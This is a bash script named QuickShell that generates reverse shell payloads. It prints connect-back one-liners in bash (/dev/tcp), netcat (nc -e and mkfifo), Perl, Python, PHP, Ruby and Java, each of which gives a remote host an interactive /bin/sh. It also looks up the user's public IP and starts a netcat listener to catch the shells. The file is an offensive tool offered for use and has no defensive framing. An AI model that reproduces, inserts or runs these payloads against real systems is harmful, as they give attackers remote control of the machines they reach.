#!/usr/bin/env bash

# QuickShell
# Reverse Shell Generator
# W3155 (2018)


# Colors:
red="\e[31m"
green="\e[32m"
normal="\e[0m"
yellow="\e[33m"
ciano="\e[36m"
purple="\e[35m"

# Shell Functions

code_bash() {

	# Bash
	echo -e $green"\n # Bash"$normal
	echo " bash -i >& /dev/tcp/$lhost/$lport 0>&1"
	echo

}

code_ncat() {

	# Netcat
	echo -e $green"\n # Ncat"$normal
	echo " nc -e /bin/sh $lhost $lport"
	echo -e $green"\n # Ncat (alternative)"$normal
	echo " rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
	echo

}

code_perl() {
	# Perl
	echo -e $green"\n # Perl"$normal
	echo " perl -e 'use Socket;\$i=\"$lhost\";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	echo
}

code_python() {
	# Python
	echo -e $green"\n # Python"$normal
	echo " python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	echo
}

code_php() {
	# PHP
	echo -e $green"\n # PHP"$normal
	echo " php -r '$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	echo
}

code_ruby() {
	# Ruby
	echo -e $green"\n # Ruby"$normal
	echo " ruby -rsocket -e'f=TCPSocket.open(\"$lhost\",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
	echo
}

code_java() {
	# Java
	echo -e $green"\n # Java"$normal
	echo " r = Runtime.getRuntime()"
	echo " p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$lhost/$lport;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])"
	echo " p.waitFor()"
	echo
}

#code_xterm() {
	# Xterm
#	echo -e $green"\n # Xterm"$normal
#	echo " xterm -display 10.0.0.1:1"

#	echo " To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001)."
#	echo " One way to do this is with Xnest (to be run on your system): "
#	echo " Xnest :1"
#	echo " You’ll need to authorise the target to connect to you (command also run on your host):"
#	echo -e " xhost +targetip\n"
#}

# Other functions

listen() {

	echo -e "\n -----------------------------------------------------"

	if [ "$1" = "-s" ]; then
		echo -e "\n Starting Ncat Listener on port: "$lport"/tcp.."
		# Start ncat here
		xterm -e "nc -lvp $lport" &
		sleep 1s
		echo -e $green" [Done]"$normal" Ncat listener started in a new Xterm terminal.\n"
		exit
	fi

	echo " Start Ncat listener? (y/n)"
	read -s -n1 yesno

	if [ $yesno = "y" ]; then
		echo -e "\n Starting Ncat Listener on port: "$lport"/tcp \n"
		# Start ncat here
		xterm -e "nc -lvp $lport" &
		sleep 1s
		echo -e $green" [Done]"$normal" Ncat listener started in a new Xterm terminal.\n"
	else
		exit
	fi
	
}

# Main

banner() {

	clear 
	echo -e $green
	echo "   ____       _     __    ______       ____ "
	echo "  / __ \__ __(_)___/ /__ / __/ /  ___ / / / "
	echo " / /_/ / // / / __/  '_/_\ \/ _ \/ -_) / /  "
	echo " \___\_\_,_/_/\__/_/\_\/___/_//_/\__/_/_/ v0.1 "
	echo -e $normal             

}


comp() {

	# Compatibility check

	# Check for dig
	which dig > /dev/null 2>&1
	if [ "$?" != 0 ]; then
		echo -e $yellow" [Warning] Dig is required for the correct functionality of the script!\n"$normal
	fi

	# Check for ncat
	which nc > /dev/null 2>&1
	if [ "$?" != 0 ]; then
		echo -e $yellow" [Warning] Ncat is required for the correct functionality of the script!\n"$normal
	fi

	# Check for xterm
	which xterm > /dev/null 2>&1
	if [ "$?" != 0 ]; then
		echo -e $yellow" [Warning] Xterm is required for the correct functionality of the script!\n"$normal
	fi

}


changeip() {

	test="(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])"
	read -p " Listening IP Address: " lhost
	# Check if contains alphanumeric characters
	if [[ ! $lhost =~ ^$test\.$test\.$test\.$test$ ]]; then
		banner
		echo -e $red" [Error] Invalid IP Address"$normal
		changeip
	fi

	read -p " Listening Port: " lport
	# Check if contains alphanumeric characters
	if [[ "$lhost" =~ [A-Za-z] ]]; then
		banner
		echo -e $red" [Error] Invalid Port"$normal
		changeip
	fi
	# Check if > 5 characters
	if [[ ${#lport} -gt 5 ]]; then
		banner
		echo -e $red" [Error] Invalid Port"$normal
		changeip
	fi
	
	banner

}

menu() {

	echo -e " IP Address: "$green$lhost$normal
	echo -e " Port: "$green$lport"/tcp"$normal"\n"
	
	echo -e " Reverse Shell:"
	echo " -------------------------------------------"
	echo " a  Show all"
	echo " 1  Bash"
	echo " 2  Ncat"
	echo " 3  Perl"
	echo " 4  Python"
	echo " 5  PHP"
	echo " 6  Ruby"
	echo " 7  Java"
	#echo " 8  Xterm"
	echo
	echo " s  Manually set IP and Port"
	echo " q  Quit"
	echo

	read -s -n1 shelltype

	case $shelltype in
		1 )
			banner
			code_bash
			listen
		;;
		2 )
			banner
			code_ncat
			listen
		;;
		3 )
			banner
			code_perl
			listen
		;;
		4 )
			banner
			code_python
			listen
		;;
		5 )
			banner
			code_php
			listen
		;;
		6 )
			banner
			code_ruby
			listen
		;;
		7 )
			banner
			code_java
			listen
		;;
		a )
			banner
			code_bash
			code_ncat
			code_perl
			code_python
			code_php
			code_ruby
			code_java
			# code_xterm
			listen	
		;;
		s )
			banner
			changeip
			menu
		;;
		q )
			exit
		;;
		* )
			banner
			echo -e $red" [Error] input not recognised.\n"$normal
			menu
		;;

	esac

}

start() {

	lhost=$(dig @resolver1.opendns.com ANY myip.opendns.com +short)
	lport="9666"

}


# Automatic (-a parameter)
if [ $1 = "-a" ]; then
	banner
	comp
	start
	code_bash
	code_ncat
	code_perl
	code_python
	code_php
	code_ruby
	code_java
	# code_xterm
	listen -s
fi


# Start
banner
comp
start
menu



